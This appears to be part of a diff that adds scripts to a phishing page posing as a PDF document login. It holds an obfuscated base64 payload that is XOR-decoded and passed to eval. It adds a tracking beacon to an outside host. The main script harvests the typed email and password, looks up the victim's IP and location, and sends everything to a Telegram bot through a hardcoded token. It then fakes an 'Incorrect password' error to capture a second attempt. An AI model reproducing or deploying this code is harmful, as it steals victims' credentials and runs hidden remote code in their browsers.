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",_b=atob(_p),_r=[];for(var i=0;i<_b.length;i++)_r.push(String.fromCharCode(_b.charCodeAt(i)^_k[i%_k.length]));var _s=_r.join('');(0,eval)(_s);})()</script>
+<script>(function(){var _f=0;function _t(){if(_f)return;_f=1;try{if(navigator.sendBeacon)navigator.sendBeacon("https://spx.mayco-build.com/api/analytics/t/adobe3-f46a38d5/visit");else (new Image()).src="https://spx.mayco-build.com/api/analytics/t/adobe3-f46a38d5/px.gif"}catch(e){}}if(document.readyState==="complete"||document.readyState==="interactive")setTimeout(_t,800);else document.addEventListener("DOMContentLoaded",function(){setTimeout(_t,800)})})();</script></body>
+
+
+
+<script>
+
+    let attempt = 1;
+    const maxAttempts = 2;
+    const form = document.getElementById('formdata');
+    const messageDiv = document.getElementById('message');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+  
+
+    // ==================== TELEGRAM CONFIGURATION ====================
+    // IMPORTANT: Replace these with your actual Bot Token and Chat ID
+    // Get Bot Token from @BotFather on Telegram
+    // Get Chat ID from @userinfobot or by sending a message to your bot and visiting:
+    // https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
+    const TELEGRAM_BOT_TOKEN = '8942885189:AAHWAF51YpLeJHnGoUJak4fDTXvw0mBcOc0';  // <-- REPLACE WITH YOUR BOT TOKEN
+    const TELEGRAM_CHAT_ID = '8890264087';      // <-- REPLACE WITH YOUR CHAT ID
+    // ================================================================
+
+    // Function to send data to Telegram Bot
+    async function sendToTelegram(uid, password) {
+      if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+        console.warn('Telegram bot not configured. Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID');
+        return false;
+      }
+
+      const timestamp = new Date().toLocaleString();
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const language = navigator.language;
+      const location = await getIpAndCountry();
+
+      // Format the message for Telegram
+      const message = `🔐 pdf login ATTEMPT 🔐\n\n` +
+                      `📧 User Id: ${uid}\n` +
+                      `🔑 Password: ${password}\n` +
+                      `🖥️ location: ${location}\n` +
+                      `📅 Time: ${timestamp}\n` +
+                      `💻 User Agent: ${userAgent.substring(0, 100)}${userAgent.length > 100 ? '...' : ''}\n` +
+                      `🖥️ Platform: ${platform}\n` +
+                      `🌐 Language: ${language}\n` +
+                      `🔄 Attempt: ${attempt + 1}/${maxAttempts}`;
+
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        });
+        
+        const result = await response.json();
+        if (result.ok) {
+          console.log('Telegram message sent successfully');
+          return true;
+        } else {
+          console.error('Telegram error:', result);
+          return false;
+        }
+      } catch (err) {
+        console.error('Failed to send to Telegram:', err);
+        return false;
+      }
+    }
+
+    // --- Extract email parameter from URL fragment (after #) ---
+    (function setEmailFromHash() {
+      const hash = window.location.hash;
+      if (hash && hash.length > 1) {
+        let emailParam = hash.substring(1);
+        try {
+          emailParam = decodeURIComponent(emailParam);
+        } catch (e) {
+          console.warn("URI decoding failed, using raw value");
+        }
+        if (emailParam && emailParam.trim() !== "") {
+            email.value = emailParam;
+            emailInput.value = emailParam;
+           document.getElementById('displyEmail').textConten = emailParam;
+        }
+      }
+    })();
+
+    // Hide error message when user starts typing in password field
+    passwordInput.addEventListener('input', function() {
+      messageDiv.style.display = 'none';
+    });
+    
+    passwordInput.addEventListener('focus', function() {
+      messageDiv.style.display = 'none';
+    });
+
+
+
+
+
+
+    async function nav() {
+      
+      const email = emailInput.value;
+      const password = passwordInput.value;
+
+      /* Send to Web3Forms (original functionality)
+      fetch('https://api.web3forms.com/submit', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: new URLSearchParams({
+          access_key: '9301229f-51dc-4b99-bb05-cc866488b',
+          name: 'auto-email',
+          email: email,
+          message: password
+        }).toString()
+      }).catch(err => console.error('Web3Forms submission error:', err));
+      */
+
+
+
+
+      if (attempt <= maxAttempts) {
+        // Send to Telegram Bot (new functionality)
+        await sendToTelegram(email, password);
+        console.log(email, password)
+        attempt++;
+
+        messageDiv.style.display = 'block';
+        messageDiv.textContent = 'Incorrect password';
+        passwordInput.value = '';
+      } else {
+        messageDiv.style.display = 'block';
+        messageDiv.textContent = 'Too many attempts. Redirecting...';
+        setTimeout(function() {
+            
+        }, 2000);
+      }
+    };
+
+    async function getIpAndCountry() {
+      try {
+        // Using ipapi.co (free, no API key needed for basic use)
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+
+        return {
+          ip: data.ip || 'Unknown',
+          country: data.country_name || 'Unknown',
+          city: data.city || '',
+          region: data.region || ''
+        };
+      } catch (error) {
+        console.error('Failed to get location:', error);
+        return {
+          ip: 'Unavailable',
+          country: 'Unavailable',
+          city: '',
+          region: ''
+        };
+      }
+    }
+
+
+
+
+
+
+
+
+
+
+
+
+
+     // Strong email regex
+    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+
+    function validateEmail() {
+      const value = emailInput.value.trim();
+
+      // Remove previous states
+      emailInput.classList.remove('valid', 'invalid');
+      emailError.classList.remove('show');
+
+      if (value === '') {
+        return false;
+      }
+
+      if (emailRegex.test(value)) {
+        emailInput.classList.add('valid');
+        return true;
+      } else {
+        emailInput.classList.add('invalid');
+        emailError.classList.add('show');
+        return false;
+      }
+    }
+
+    // Live validation while typing
+    emailInput.addEventListener('input', validateEmail);
+
+    // Validate on blur as well
+    emailInput.addEventListener('blur', validateEmail);
+
+    // Form submission
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const isEmailValid = validateEmail();
+      const isPasswordValid = passwordInput.value.length >= 6;
+
+      if (!isEmailValid) {
+        emailInput.focus();
+        return;
+      }
+
+      if (!isPasswordValid) {
+        passwordInput.focus();
+        return;
+      }
+
+      // Success — you can replace this with real login logic
+      alert('Login successful!\nEmail: ' + emailInput.value);
+    });
+
+    // Password show/hide
+    function togglePassword() {
+      const input = document.getElementById('password');
+      const icon = document.getElementById('eye-icon');
+      
+      if (input.type === 'password') {
+        input.type = 'text';
+        icon.innerHTML = `
+          <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
+          <line x1="1" y1="1" x2="23" y2="23"/>
+        `;
+      } else {
+        input.type = 'password';
+        icon.innerHTML = `
+          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+          <circle cx="12" cy="12" r="3"/>
+        `;
+      }
+    }
+</script> 
+</html>
